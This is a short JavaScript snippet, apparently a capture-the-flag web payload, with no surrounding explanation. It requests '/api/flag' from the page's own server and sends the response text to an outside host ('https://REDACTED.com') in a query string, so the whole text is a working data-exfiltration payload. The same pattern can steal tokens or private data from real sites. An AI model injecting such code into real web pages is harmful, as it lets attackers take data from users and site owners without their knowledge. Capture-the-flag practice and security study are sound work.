fetch('/api/flag')
  .then(res => res.text())
  .then(flag => fetch('https://REDACTED.com?flag=' + encodeURIComponent(flag)));
